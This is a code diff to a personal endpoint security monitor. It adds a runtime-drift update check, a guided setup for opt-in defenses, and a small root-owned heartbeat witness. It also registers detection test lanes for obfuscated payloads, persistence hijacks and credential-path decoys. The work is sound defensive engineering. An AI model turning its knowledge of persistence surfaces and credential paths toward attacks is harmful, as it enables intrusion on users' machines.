+         "obfuscated inline payload scores; plain and unflagged argv do not",
+         lane_argv_obfuscation),
+        ("intel-match",
+         "an IOC-set hash/endpoint is CRITICAL, a miss stays silent",
+         lane_intel_match),
+        ("win-evasion",
+         "COM/IFEO/AppInit hijack diffs fire, ordinary churn does not",
+         lane_win_evasion),
+        ("sysmon-scoring",
+         "Sysmon EID1/6 scoring fires; signed-and-trusted stays silent",
+         lane_sysmon_scoring),
         ("hostile-content", "shell-content grammar still matches",
          lane_hostile_content),
         ("risky-location", "volatile exec dirs still rate as risky",
@@ -13624,6 +14940,17 @@ def _install_mac(runtime, mode, interval):
         '    <key>ProgramArguments</key>\n    <array>\n%s    </array>\n'
         '%s'
         '    <key>RunAtLoad</key>\n    <true/>\n'
+        # Resource politeness, and not cosmetic: a full scan spawns many
+        # short-lived subprocesses for ~a minute, so an un-niced monitor is felt
+        # on a laptop. ThrottleInterval additionally bounds KeepAlive respawn in
+        # watch mode — without it a crash-looping watch is relaunched about once
+        # a second instead of every 30. install.sh has always written these
+        # four; this Python port dropped them, so the two installers disagreed
+        # while the README called them equivalent.
+        '    <key>ProcessType</key>\n    <string>Background</string>\n'
+        '    <key>LowPriorityIO</key>\n    <true/>\n'
+        '    <key>Nice</key>\n    <integer>10</integer>\n'
+        '    <key>ThrottleInterval</key>\n    <integer>30</integer>\n'
         '    <key>StandardOutPath</key>\n    <string>%s</string>\n'
         '    <key>StandardErrorPath</key>\n    <string>%s</string>\n'
         '  </dict>\n</plist>\n'
@@ -13834,6 +15161,342 @@ def cmd_uninstall():
     return 0
 
 
+# --------------------------------------------------------------------------- #
+# update-check — the runtime copy silently stales behind the repo.
+#
+# `install` copies aegis.py to ~/.aegis/aegis.py and schedules THAT copy (the
+# TCC reasoning is above _install_runtime_copy). The README warns "re-run
+# install after editing aegis.py", but a warning nobody re-reads is not a
+# control: every repo edit silently forks this file from what the background
+# monitor actually executes. This makes the drift detectable — by hand here,
+# and on every `doctor` run, where rot is supposed to surface.
+# --------------------------------------------------------------------------- #
+
+def _runtime_copy_status():
+    """Compare the INVOKED aegis.py against the installed runtime copy.
+
+    Returns 'not-installed' (no runtime copy), 'self' (this IS the runtime
+    copy — nothing independent to compare), 'in-sync', 'drift', or 'unknown'
+    (hashing failed; never reported as clean)."""
+    src = os.path.realpath(_SELF_PATH)
+    if not os.path.exists(RUNTIME_SCRIPT):
+        return "not-installed"
+    if os.path.realpath(RUNTIME_SCRIPT) == src:
+        return "self"
+    a, b = sha256(src), sha256(RUNTIME_SCRIPT)
+    if not a or not b:
+        return "unknown"
+    return "in-sync" if a == b else "drift"
+
+
+def _refresh_line():
+    """The exact command that refreshes the runtime copy — preserving the
+    recorded install mode, so pasting it never silently downgrades a
+    watch-mode install to scan mode. Quoted for pasting as-is: the reference
+    machine's repo path contains both spaces and '&'."""
+    mode = load_json(SELFSTATE, {}).get("install_mode")
+    py = sys.executable or "python3"
+    src = os.path.realpath(_SELF_PATH)
+    pair = ('"%s" "%s"' % (py, src) if IS_WIN
+            else "%s %s" % (shlex.quote(py), shlex.quote(src)))
+    return "%s install%s" % (pair, " watch" if mode == "watch" else "")
+
+
+def _git_origin_url(repo_dir):
+    """`git remote get-url origin` for repo_dir, falling back to reading the
+    config file directly where git is not on run()'s restricted PATH
+    (Windows). One level of `gitdir:` indirection (worktrees) is followed."""
+    out, _e, rc = run(["git", "-C", repo_dir, "remote", "get-url", "origin"],
+                      timeout=15)
+    if rc == 0 and (out or "").strip():
+        return (out or "").strip().splitlines()[0].strip()
+    gd = os.path.join(repo_dir, ".git")
+    try:
+        if os.path.isfile(gd):
+            with open(gd, encoding="utf-8") as f:
+                head = f.read().strip()
+            if not head.startswith("gitdir:"):
+                return None
+            gd = os.path.normpath(os.path.join(
+                repo_dir, head.split(":", 1)[1].strip()))
+            common = os.path.join(gd, "commondir")
+            if os.path.isfile(common):
+                with open(common, encoding="utf-8") as f:
+                    gd = os.path.normpath(os.path.join(gd, f.read().strip()))
+        section = None
+        with open(os.path.join(gd, "config"), encoding="utf-8") as f:
+            for line in f:
+                s = line.strip()
+                if s.startswith("["):
+                    section = s.lower()
+                elif (section == '[remote "origin"]'
+                        and s.lower().startswith("url")):
+                    _k, sep, v = s.partition("=")
+                    if sep:
+                        return v.strip()
+    except Exception:
+        pass
+    return None
+
+
+def _github_raw_url():
+    """Canonical GitHub raw URL for THIS file, derived from the invoked
+    checkout's `origin` remote. None when there is no GitHub origin — the
+    remote check refuses to guess a URL."""
+    origin = _git_origin_url(os.path.dirname(os.path.realpath(_SELF_PATH)))
+    m = re.search(r"github\.com[:/]([\w.-]+)/([\w.-]+?)(?:\.git)?/?$",
+                  origin or "")
+    if not m:
+        return None
+    return ("https://raw.githubusercontent.com/%s/%s/HEAD/aegis.py"
+            % (m.group(1), m.group(2)))
+
+
+def cmd_update_check(remote=False):
+    """Is the installed runtime copy stale behind the invoked aegis.py?
+    Drift → exit 1 with the exact refresh command; in sync or not installed →
+    exit 0. `--remote` additionally compares this file against the repo's
+    canonical GitHub raw copy — a BY-HAND network call (lazy urllib, the `vt`
+    pattern); the scan path never reaches this code."""
+    status = _runtime_copy_status()
+    rc = 0
+    if status == "not-installed":
+        print("No runtime copy installed at %s — nothing to drift "
+              "(`aegis.py install` registers the background monitor)."
+              % RUNTIME_SCRIPT)
+    elif status == "self":
+        print("This IS the installed runtime copy (%s); run update-check "
+              "from the repo checkout to compare the two." % RUNTIME_SCRIPT)
+    elif status == "in-sync":
+        print("Runtime copy is in sync: %s matches this file (sha256)."
+              % RUNTIME_SCRIPT)
+    elif status == "unknown":
+        print("Could not hash both copies — drift is UNKNOWN, not clean "
+              "(check permissions on %s)." % RUNTIME_SCRIPT)
+        rc = 1
+    else:  # drift
+        print("STALE: %s does not match this file — the background monitor "
+              "is running OLD code.\nRefresh it:\n  %s"
+              % (RUNTIME_SCRIPT, _refresh_line()))
+        rc = 1
+    if not remote:
+        return rc
+    url = _github_raw_url()
+    if not url:
+        print("\n--remote: no GitHub `origin` remote found for %s — remote "
+              "comparison skipped rather than guessed."
+              % os.path.dirname(os.path.realpath(_SELF_PATH)))
+        return rc or 2
+    print("\n--remote: fetching %s\n(the canonical copy of this file; that "
+          "URL is the ONLY request made, and nothing about this machine is "
+          "sent)" % url)
+    import urllib.request  # lazy: only this by-hand flag branch loads networking
+    try:
+        with urllib.request.urlopen(url, timeout=20) as resp:
+            data = resp.read()
+    except Exception as e:
+        print("--remote: fetch failed (%s) — remote comparison is unknown, "
+              "not clean." % e)
+        return rc or 2
+    local = sha256(os.path.realpath(_SELF_PATH))
+    if local and hashlib.sha256(data).hexdigest() == local:
+        print("--remote: this file matches the GitHub HEAD copy.")
+        return rc
+    print("--remote: this file DIFFERS from the GitHub HEAD copy — local "
+          "edits, or the repo moved ahead (`git pull` in the checkout, then "
+          "re-run install).")
+    return 1
+
+
+# --------------------------------------------------------------------------- #
+# setup — guided walkthrough of the OPT-IN tiers.
+#
+# The strongest defenses in this file (canary, latch, decoys, guard, the
+# watchdog pairing, the off-host heartbeat) are opt-in and therefore DORMANT
+# on most installs — a documented tier nobody turned on protects nobody.
+# `setup` walks them once: one honest sentence of benefit-and-cost each,
+# default No. It ORCHESTRATES the existing commands and never reimplements
+# one — a yes runs exactly what typing the individual command would have run,
+# so there is no second code path to drift. Idempotent: a tier already on is
+# detected from the same state the status/scan paths read, shown as enabled,
+# and skipped.
+# --------------------------------------------------------------------------- #
+
+def _setup_stdio_is_interactive():
+    """setup's tty gate, split out so the suite can drive the walkthrough with
+    a scripted harness. This is a UX refusal (a walkthrough nobody is reading
+    is cron-log noise), NOT a security gate: everything setup can invoke is an
+    ordinary by-hand command a script could already call directly. The gate
+    that must resist automation (`unlatch`) keeps its own out-of-band
+    challenge regardless of how it is reached."""
+    try:
+        return sys.stdin.isatty() and sys.stdout.isatty()
+    except Exception:
+        return False
+
+
+def _ask_yn(question):
+    """One y/n prompt, default No; EOF/interrupt is No (opt-IN means opt-in)."""
+    try:
+        return input("%s [y/N] " % question).strip().lower() in ("y", "yes")
+    except (EOFError, KeyboardInterrupt):
+        print()
+        return False
+
+
+def _ask_line(prompt):
+    try:
+        return input(prompt).strip()
+    except (EOFError, KeyboardInterrupt):
+        print()
+        return ""
+
+
+def cmd_setup():
+    """Guided, idempotent walkthrough of the opt-in tiers (block comment
+    above). Refuses a non-tty caller with the same posture as unlatch."""
+    if not _setup_stdio_is_interactive():
+        print("refuse: setup is an interactive walkthrough and needs a real "
+              "terminal — run it from a shell, not a script.")
+        return 1
+    ensure_state()
+    print("# Aegis setup — the opt-in tiers, one honest question each.\n"
+          "# Everything below is OFF by default and stays off unless you say "
+          "yes;\n# each yes runs exactly the command you could type yourself, "
+          "nothing more.\n")
+
+    st = load_json(SELFSTATE, {})
+    if st.get("installed"):
+        print("[enabled] background monitor — installed (%s mode)."
+              % (st.get("install_mode") or "scan"))
+    else:
+        print("Background monitor: registers a scheduled `scan` for this OS "
+              "(launchd / systemd --user / Task Scheduler); costs one "
+              "background job and a few seconds of CPU per interval.")
+        if _ask_yn("  install the background monitor?"):
+            watch = _ask_yn("  use watch mode (change-driven; rescans within "
+                            "seconds of a file touch, full scan as a floor)?")
+            mode = "watch" if watch else "scan"
+            raw = _ask_line("  full-scan interval in seconds [default %d]: "
+                            % (600 if watch else 3600))
+            cmd_install(mode, int(raw) if raw.isdigit() else None)
+
+    if load_json(CANARY_STATE, {}):
+        print("[enabled] canary files — planted "
+              "(`aegis.py canary remove` removes them).")
+    else:
+        print("Canary files: hidden tripwires in your user dirs whose "
+              "modification or deletion alerts CRITICAL (a near-zero-false-"
+              "positive ransomware signal); costs a few hidden files.")
+        if _ask_yn("  plant canary files?"):
+            cmd_canary("plant")
+
+    if load_json(LATCH_FILE, {}):
+        print("[enabled] latch — persistence surfaces are pre-claimed "
+              "(`aegis.py latch status`).")
+    else:
+        print("Latch: pre-claims the persistence surfaces so a dropper's "
+              "write FAILS (%s); costs running `aegis.py unlatch <path>` "
+              "before a legitimate installer may write there."
+              % ("chflags uchg" if IS_MAC else "a deny-write ACE" if IS_WIN
+                 else "a mode change — a labelled speed bump on Linux"))
+        if _ask_yn("  latch the persistence surfaces?"):
+            cmd_latch("on")
+
+    # Decoys are a POSIX FIFO mechanism; on Windows the surface is absent
+    # (not degraded), so the walkthrough says nothing about it there.
+    if hasattr(os, "mkfifo"):
+        if load_json(DECOY_FILE, {}):
+            print("[enabled] decoys — FIFO honeytokens planted "
+                  "(`aegis.py decoy remove` removes them).")
+        else:
+            print("Decoys: FIFO honeytokens at credential-shaped paths "
+                  "(~/.aws, ~/.ssh) where ANY read is an attacker by "
+                  "construction; costs three fake dotfiles.")
+            if _ask_yn("  plant credential decoys?"):
+                cmd_decoy("plant")
+
+    if os.path.isfile(_guard_paths()[0]):
+        print("[enabled] guard — installed (observe-only; `aegis.py guard "
+              "status` shows what it has seen).")
+    else:
+        print("Guard: an OBSERVE-ONLY pre-exec hook that learns pasted-vs-"
+              "typed from your shell's bracketed paste (the ClickFix shape); "
+              "costs one line you add to your rc file yourself — it refuses "
+              "nothing and Aegis never edits your rc.")
+        if _ask_yn("  write the guard hook files?"):
+            cmd_guard("install")
+
+    # Explained, not performed: a watchdog the monitor registers for itself
+    # dies with it, which is precisely the failure it exists to see.
+    print("\nDead-man's switch: schedule `aegis.py watchdog` from a SECOND, "
+          "independent agent/cron/task so a killed or booted-out monitor "
+          "raises an alarm. Aegis will not register its own watchdog — one "
+          "that dies with its monitor is theater.")
+
+    if _heartbeat_url():
+        print("[enabled] off-host heartbeat — configured (the one background "
+              "egress; a small redacted beat per healthy scan).")
+    else:
+        print("Off-host heartbeat: the ONE background egress, OFF by default "
+              "— given a URL you control, every healthy scan POSTs a small "
+              "redacted liveness beat there, so silence leaves the box even "
+              "when every local sink is being suppressed.")
+        if _ask_yn("  configure a heartbeat URL?"):
+            url = _ask_line("  URL to POST the beat to (https://…): ")
+            if url.startswith(("http://", "https://")):
+                cfg = _aegis_config()
+                cfg = cfg if isinstance(cfg, dict) else {}
+                cfg["heartbeat_url"] = url
+                save_json(AEGIS_CONFIG, cfg)
+                print("  saved heartbeat_url to %s." % AEGIS_CONFIG)
+            elif url:
+                print("  not saved: %r is not an http(s) URL." % url)
+
+    # Tiers that exist only on some builds: probe the module at runtime and
+    # point at them, so this walkthrough never depends on a sibling branch.
+    for fn, pointer in (("cmd_rootwatch", "rootwatch — `aegis.py rootwatch`"),
+                        ("cmd_intel", "intel — `aegis.py intel`")):
+        if callable(globals().get(fn)):
+            print("Also available on this build: %s." % pointer)
+
+    _setup_summary()
+    return 0
+
+
+def _setup_summary():
+    """One-screen posture summary, read from the same state the tier
+    detections above use — never from what this run happened to answer."""
+    st = load_json(SELFSTATE, {})
+    canaries = load_json(CANARY_STATE, {})
+    latches = load_json(LATCH_FILE, {})
+    rows = [
+        ("background monitor",
+         "on (%s mode)" % (st.get("install_mode") or "scan")
+         if st.get("installed") else "off — aegis.py install"),
+        ("canary files", "on (%d planted)" % len(canaries) if canaries
+         else "off — aegis.py canary"),
+        ("latch", "on (%d surfaces)" % len(latches) if latches
+         else "off — aegis.py latch on"),
+    ]
+    if hasattr(os, "mkfifo"):
+        decoys = load_json(DECOY_FILE, {})
+        rows.append(("decoys", "on (%d planted)" % len(decoys) if decoys
+                     else "off — aegis.py decoy plant"))
+    rows.append(("guard", "on (observe-only)"
+                 if os.path.isfile(_guard_paths()[0])
+                 else "off — aegis.py guard install"))
+    rows.append(("off-host heartbeat",
+                 "on" if _heartbeat_url() else "off (local-only)"))
+    rows.append(("watchdog pairing",
+                 "run `aegis.py watchdog` from a second agent/cron/task"))
+    print("\n# Posture after setup")
+    for name, val in rows:
+        print("  %-22s %s" % (name, val))
+    print("\nFull posture any time: aegis.py status   "
+          "(coverage: aegis.py doctor)")
+
+
 def cmd_watchdog():
     """Dead-man's-switch check: is the monitor still beating? Meant to be run by
     a SECOND launchd agent or cron (the unprivileged mutual-watchdog), or by an
@@ -13925,6 +15588,379 @@ def cmd_bastion():
           "investigate any you don't recognize.")
     log_run("bastion: surfaced %d XPdb rows" % len(rows))
     return 0
+
+
+# --------------------------------------------------------------------------- #
+# Opt-in ROOT witness: rootwatch.
+#
+# `watchdog` is a dead-man's switch, but it runs at the SAME uid as the
+# monitor: the attacker who kills Aegis kills the watchdog agent in the same
+# sweep, and the notary only makes the kill evident at the next human look.
+# The one thing that closes that gap is a witness the attacker cannot reach
+# without root — so this tier, alone in Aegis, installs a privileged
+# component. It is held to the `bastion` doctrine: OPT-IN (Aegis never
+# self-elevates; unprivileged `rootwatch install` mutates nothing and prints
+# the sudo line for the human to run), SINGLE-PURPOSE (read one heartbeat
+# file, alert on staleness, nothing else), and TINY (the generated script is
+# under 60 lines, imports five stdlib modules, and is meant to be read in one
+# glance before you install it — the smallness IS the security argument).
+#
+# The generated script deliberately NEVER writes into the user's ~/.aegis:
+# root-owned files appearing in user state would break Aegis's own
+# atomic-replace assumptions (os.replace onto a root-owned target fails for
+# the user, killing every subsequent scan's state writes).
+# --------------------------------------------------------------------------- #
+
+# str.format (not %) on purpose: the generated code is full of runtime
+# %-formatting, and the only generation-time substitutions are the five
+# {name} fields. The script uses a one-line import to protect its own audit
+# budget — the ≤60-line bound is pinned by the test suite.
+_ROOTWATCH_TEMPLATE = '''\
+#!/usr/bin/env python3
+# aegis-rootwatch -- generated by `aegis.py rootwatch install`. Do not edit;
+# re-run install to regenerate.
+#
+# This is the ONLY thing Aegis ever runs as root, and it is deliberately
+# small enough to audit in one glance -- the smallness IS the security
+# argument. One job: read ONE user file (the monitor's heartbeat) and, if
+# the beat is stale, say so in places a same-uid attacker cannot silence
+# (a root-owned log, syslog, the user's screen). It takes no input beyond
+# the constants baked in below, imports nothing outside the five stdlib
+# modules here, and NEVER writes into the user's home -- a root-owned file
+# in ~/.aegis would break Aegis's own atomic-replace assumptions.
+import json, os, subprocess, sys, time
+
+HEARTBEAT = {hb!r}  # the watched user's beat file (READ-only here)
+UID = {uid}  # whose session to notify
+TOLERANCE = {tol}  # seconds; mirrors aegis.py HEARTBEAT_STALE_SECS
+LOG = {log!r}  # root-owned durable alert trail (kept on uninstall)
+MAC = {mac!r}
+
+
+def main():
+    try:
+        with open(HEARTBEAT, "r", encoding="utf-8") as f:
+            last = int(json.load(f).get("epoch") or 0)
+    except Exception:
+        last = 0  # missing/unreadable/wiped state reads as DEAD, never healthy
+    age = int(time.time()) - last if last else None
+    if age is not None and age <= TOLERANCE:
+        return 0  # healthy: silent by design
+    human = ("no heartbeat could be read" if age is None else
+             "last beat %d min ago (> %d min tolerance)"
+             % (age // 60, TOLERANCE // 60))
+    msg = ("Aegis rootwatch: the monitor is NOT beating -- %s. It may have "
+           "been killed or unloaded; run `aegis.py watchdog` as the user."
+           % human)
+    try:
+        os.makedirs(os.path.dirname(LOG), mode=0o755, exist_ok=True)
+        with open(LOG, "a", encoding="utf-8") as f:
+            f.write("%s  %s\\n" % (time.strftime("%Y-%m-%dT%H:%M:%S%z"), msg))
+    except Exception:
+        pass
+    note = 'display notification "%s" with title "Aegis rootwatch"' % human
+    cmds = ([["launchctl", "asuser", str(UID), "osascript", "-e", note]]
+            if MAC else
+            [["notify-send", "-u", "critical", "Aegis rootwatch", msg],
+             ["wall", msg]])
+    for argv in cmds + [["logger", "-t", "aegis-rootwatch", msg]]:
+        try:
+            subprocess.run(argv, timeout=15, stdout=subprocess.DEVNULL,
+                           stderr=subprocess.DEVNULL)
+        except Exception:
+            pass  # each sink is best-effort; the LOG line above is the anchor
+    print(msg, file=sys.stderr)
+    return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+'''
+
+_ROOTWATCH_SERVICE = """\
+[Unit]
+Description=Aegis root witness (alerts when the user monitor stops beating)
+
+[Service]
+Type=oneshot
+ExecStart="%(py)s" "%(script)s"
+# The witness only reads one heartbeat file and appends its own alert log.
+NoNewPrivileges=true
+"""
+
+_ROOTWATCH_TIMER = """\
+[Unit]
+Description=Aegis root witness timer
+
+[Timer]
+OnBootSec=2min
+OnUnitActiveSec=%(interval)ds
+Persistent=true
+
+[Install]
+WantedBy=timers.target
+"""
+
+
+def _rootwatch_script_text(hb_path, uid, log_path, mac=IS_MAC):
+    """Generate the privileged witness with the watched user's paths, uid and
+    the watchdog's own staleness tolerance baked in at generation time."""
+    return _ROOTWATCH_TEMPLATE.format(hb=hb_path, uid=int(uid),
+                                      tol=HEARTBEAT_STALE_SECS, log=log_path,
+                                      mac=bool(mac))
+
+
+def _rootwatch_plist_text():
+    """The root LaunchDaemon: run the witness every ROOTWATCH_INTERVAL secs.
+    Paths are entity-escaped like the user agent's plist (the F0 lesson)."""
+    logdir = os.path.dirname(ROOTWATCH_LOG)
+    return (
+        '<?xml version="1.0" encoding="UTF-8"?>\n'
+        '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
+        '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
+        '<plist version="1.0">\n  <dict>\n'
+        '    <key>Label</key>\n    <string>%s</string>\n'
+        '    <key>ProgramArguments</key>\n    <array>\n'
+        '        <string>%s</string>\n'
+        '        <string>%s</string>\n'
+        '    </array>\n'
+        '    <key>StartInterval</key>\n    <integer>%d</integer>\n'
+        '    <key>RunAtLoad</key>\n    <true/>\n'
+        '    <key>StandardOutPath</key>\n    <string>%s</string>\n'
+        '    <key>StandardErrorPath</key>\n    <string>%s</string>\n'
+        '  </dict>\n</plist>\n'
+        % (ROOTWATCH_LABEL, _xml_escape(ROOTWATCH_PY),
+           _xml_escape(ROOTWATCH_SCRIPT), ROOTWATCH_INTERVAL,
+           _xml_escape(os.path.join(logdir, "rootwatch.out")),
+           _xml_escape(os.path.join(logdir, "rootwatch.err"))))
+
+
+def _rootwatch_unit_texts():
+    """(service, timer) for the SYSTEM systemd instance — not --user, which
+    would die with the session and be disable-able by the same uid."""
+    service = _ROOTWATCH_SERVICE % {"py": ROOTWATCH_PY,
+                                    "script": ROOTWATCH_SCRIPT}
+    timer = _ROOTWATCH_TIMER % {"interval": ROOTWATCH_INTERVAL}
+    return service, timer
+
+
+def _rootwatch_installed():
+    """File presence only (no launchctl/systemctl call) — cheap enough for
+    the doctor line, and answerable without root on both platforms."""
+    if IS_WIN:
+        return False
+    reg = ROOTWATCH_PLIST if IS_MAC else os.path.join(ROOTWATCH_UNIT_DIR,
+                                                      "aegis-rootwatch.timer")
+    return os.path.exists(ROOTWATCH_SCRIPT) and os.path.exists(reg)
+
+
+def _rootwatch_target():
+    """(uid, home) of the INSTALLING user under sudo. Refuses a bare root
+    shell: the witness watches ONE user's heartbeat and must know whose —
+    guessing (or defaulting to root's own empty ~/.aegis) would install a
+    watchdog that alarms forever or never."""
+    sudo_uid = os.environ.get("SUDO_UID", "")
+    if not sudo_uid.isdigit() or int(sudo_uid) == 0:
+        return None, None
+    import pwd
+    try:
+        return int(sudo_uid), pwd.getpwuid(int(sudo_uid)).pw_dir
+    except Exception:
+        return None, None
+
+
+def _write_root_file(path, text, mode):
+    """Atomic write for the root-owned artifacts: tmp in the SAME dir, fsync,
+    replace, chown root — never a half-written daemon definition, and never
+    a user-owned file at a root path."""
+    d = os.path.dirname(path)
+    os.makedirs(d, mode=0o755, exist_ok=True)
+    tmp = os.path.join(d, ".%s.tmp%d" % (os.path.basename(path), os.getpid()))
+    fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, mode)
+    try:
+        with os.fdopen(fd, "w", encoding="utf-8") as f:
+            f.write(text)
+            f.flush()
+            os.fsync(f.fileno())
+        os.chmod(tmp, mode)
+        os.chown(tmp, 0, 0)
+        os.replace(tmp, path)
+    except Exception:
+        try:
+            os.unlink(tmp)
+        except OSError:
+            pass
+        raise
+
+
+def _rootwatch_audit(action, result, home):
+    """Append the install/uninstall record to the INVOKING user's
+    actions.jsonl — but only if that file already exists: creating it as root
+    would drop a root-owned file into user state, the exact failure the
+    generated script's header forbids. Best-effort by design; the root-owned
+    plist/unit itself is the durable record of what was installed."""
+    path = os.path.join(home, ".aegis", "actions.jsonl")
+    if not os.path.isfile(path):
+        return
+    rec = {"ts": now_iso(), "action": action, "target": ROOTWATCH_SCRIPT,
+           "result": result}
+    try:
+        with open(path, "a", encoding="utf-8") as f:
+            f.write(json.dumps(rec, sort_keys=True) + "\n")
+    except Exception:
+        pass
+
+
+def _rootwatch_install():
+    """Root half of `rootwatch install` (reached only under sudo)."""
+    uid, home = _rootwatch_target()
+    if uid is None:
+        print("refuse: cannot tell whose heartbeat to watch — run via sudo "
+              "from your own account, not from a root shell (SUDO_UID is "
+              "how the witness learns its user).")
+        return 1
+    if not os.path.exists(ROOTWATCH_PY):
+        print("refuse: %s not found — the root witness only ever runs a "
+              "root-owned system interpreter, never a user venv."
+              % ROOTWATCH_PY)
+        return 1
+    hb = os.path.join(home, ".aegis", "heartbeat.json")
+    _write_root_file(ROOTWATCH_SCRIPT,
+                     _rootwatch_script_text(hb, uid, ROOTWATCH_LOG), 0o755)
+    os.makedirs(os.path.dirname(ROOTWATCH_LOG), mode=0o755, exist_ok=True)
+    if IS_MAC:
+        _write_root_file(ROOTWATCH_PLIST, _rootwatch_plist_text(), 0o644)
+        # Idempotent like the user installer: unload any prior copy first.
+        run(["launchctl", "bootout", "system/%s" % ROOTWATCH_LABEL],
+            timeout=15)
+        _o, err, rc = run(["launchctl", "bootstrap", "system",
+                           ROOTWATCH_PLIST], timeout=15)
+        if rc != 0:
+            print("rootwatch install FAILED: launchctl bootstrap: %s"
+                  % (err or "").strip())
+            return 1
+        registered = "LaunchDaemon %s" % ROOTWATCH_LABEL
+    else:
+        service, timer = _rootwatch_unit_texts()
+        _write_root_file(os.path.join(ROOTWATCH_UNIT_DIR,
+                                      "aegis-rootwatch.service"),
+                         service, 0o644)
+        _write_root_file(os.path.join(ROOTWATCH_UNIT_DIR,
+                                      "aegis-rootwatch.timer"), timer, 0o644)
+        run(["systemctl", "daemon-reload"], timeout=30)
+        _o, err, rc = run(["systemctl", "enable", "--now",
+                           "aegis-rootwatch.timer"], timeout=30)
+        if rc != 0:
+            print("rootwatch install FAILED: systemctl enable --now: %s"
+                  % (err or "").strip())
+            return 1
+        registered = "system timer aegis-rootwatch.timer"
+    _rootwatch_audit("rootwatch-install",
+                     "installed for uid %d" % uid, home)
+    print("rootwatch installed: %s runs %s every %d min (watching %s)."
+          % (registered, ROOTWATCH_SCRIPT, ROOTWATCH_INTERVAL // 60, hb))
+    print("Alerts append to %s and notify uid %d's session. Audit the "
+          "script — it is short on purpose." % (ROOTWATCH_LOG, uid))
+    return 0
+
+
+def _rootwatch_uninstall():
+    """Root half of `rootwatch uninstall`: unregister and remove the script
+    and schedule; the alert log is EVIDENCE and is deliberately kept."""
+    if IS_MAC:
+        run(["launchctl", "bootout", "system/%s" % ROOTWATCH_LABEL],
+            timeout=15)
+        removed = [ROOTWATCH_PLIST, ROOTWATCH_SCRIPT]
+    else:
+        run(["systemctl", "disable", "--now", "aegis-rootwatch.timer"],
+            timeout=30)
+        removed = [os.path.join(ROOTWATCH_UNIT_DIR, "aegis-rootwatch.timer"),
+                   os.path.join(ROOTWATCH_UNIT_DIR,
+                                "aegis-rootwatch.service"),
+                   ROOTWATCH_SCRIPT]
+    for path in removed:
+        try:
+            os.remove(path)
+        except OSError:
+            pass
+    if IS_LINUX:
+        run(["systemctl", "daemon-reload"], timeout=30)
+    _uid, home = _rootwatch_target()
+    if home:
+        _rootwatch_audit("rootwatch-uninstall", "removed", home)
+    print("rootwatch removed. The alert log %s is kept — it is evidence."
+          % ROOTWATCH_LOG)
+    return 0
+
+
+def _rootwatch_status():
+    """Report installed/registered/last-fired without root where possible.
+    /Library/LaunchDaemons and /etc/systemd/system are world-readable, and
+    the alert log is 0644, so everything here works unprivileged."""
+    reg_path = ROOTWATCH_PLIST if IS_MAC else os.path.join(
+        ROOTWATCH_UNIT_DIR, "aegis-rootwatch.timer")
+    script = os.path.exists(ROOTWATCH_SCRIPT)
+    reg = os.path.exists(reg_path)
+    print("# Aegis rootwatch — opt-in ROOT witness\n")
+    if not script and not reg:
+        print("  absent — the kill gap is open: a same-uid attacker can kill "
+              "Aegis and the\n  user-level watchdog together, and only the "
+              "notary would show it later.\n  `aegis.py rootwatch install` "
+              "prints the sudo line that closes it.")
+        return 0
+    print("  %s script      %s" % ("✓" if script else "✗", ROOTWATCH_SCRIPT))
+    print("  %s schedule    %s" % ("✓" if reg else "✗", reg_path))
+    if IS_MAC:
+        _o, _e, rc = run(["launchctl", "print",
+                          "system/%s" % ROOTWATCH_LABEL], timeout=15)
+    else:
+        _o, _e, rc = run(["systemctl", "is-enabled",
+                          "aegis-rootwatch.timer"], timeout=15)
+    print("  %s registered  %s"
+          % ("✓" if rc == 0 else "?",
+             "loaded in the root domain" if rc == 0
+             else "not reported loaded (the query itself may need root)"))
+    last = None
+    try:
+        with open(ROOTWATCH_LOG, "r", encoding="utf-8") as f:
+            for line in f:
+                last = line.strip() or last
+    except OSError:
+        last = None
+    if last:
+        print("  ! last alert  %s" % last)
+    else:
+        print("  ✓ alerts      none recorded")
+    if script and reg:
+        print("\n  installed.")
+    else:
+        print("\n  PARTIAL install — re-run `rootwatch install` (sudo).")
+    return 0
+
+
+def cmd_rootwatch(action="status"):
+    """OPT-IN root witness — see the block comment above. Never self-elevates:
+    without root, install/uninstall perform ZERO mutation and print the one
+    pasteable sudo line; `status` needs no root at all."""
+    if action not in ("install", "status", "uninstall"):
+        print("usage: aegis.py rootwatch [install|status|uninstall]")
+        return 1
+    if IS_WIN:
+        print("rootwatch is not built for Windows yet — a SYSTEM scheduled "
+              "task is future work; the user-level watchdog still runs.")
+        return 2
+    if action == "status":
+        return _rootwatch_status()
+    if os.geteuid() != 0:
+        print("rootwatch makes no change without root: the witness must be "
+              "root-owned, or the\nsame-uid attacker who kills Aegis kills "
+              "it too. Review the generated script\n(it is under 60 lines), "
+              "then run:")
+        print('  sudo "%s" "%s" rootwatch %s'
+              % (sys.executable or "python3", _SELF_PATH, action))
+        return 2
+    return (_rootwatch_install() if action == "install"
+            else _rootwatch_uninstall())
 
 
 # --------------------------------------------------------------------------- #
@@ -14733,6 +16769,13 @@ HELP = """aegis.py - personal security monitor for macOS, Linux and Windows
                    Default: a scan every 3600s; `watch` = change-driven
                    monitoring with a [secs] full-scan floor (default 600)
   uninstall        remove that registration (local evidence is kept)
+  setup            guided, idempotent walkthrough of the OPT-IN tiers (monitor,
+                   canary, latch, decoys, guard, watchdog pairing, heartbeat);
+                   default No everywhere, already-enabled tiers are skipped
+  update-check     is the installed runtime copy (~/.aegis/aegis.py) stale
+                   behind this file? drift -> exit 1 + the exact refresh
+                   command; --remote also compares against the repo's GitHub
+                   raw copy (by hand only — the scan path stays offline)
 
  DETECT (default; runs on the scheduled interval, never destructive)
   scan             run all checks once; update report; alert on new HIGH+
@@ -14756,6 +16799,13 @@ HELP = """aegis.py - personal security monitor for macOS, Linux and Windows
   vt <path|sha256> OPT-IN VirusTotal reputation for a file/hash (sends only the
                    hash, never the file; needs AEGIS_VT_API_KEY or ~/.aegis/vt_key;
                    the scan path stays local-only regardless)
+  intel [update|status]
+                   OPT-IN community IOC intel (abuse.ch MalwareBazaar +
+                   ThreatFox; no key, no account). `update` fetches the two
+                   PUBLIC exports by hand; scans then grade the hashes they
+                   already compute and outbound ip:port rows against the
+                   LOCAL copy, offline. Nothing fetched ⇒ the surface is
+                   simply absent and the scan path stays network-free
   canary [remove]  plant (or remove) ransomware canary/honeypot files, plus
                    any OPT-IN credential-canary tokens configured as
                    "canary_tokens": [{"path": "...", "content": "..."}] in
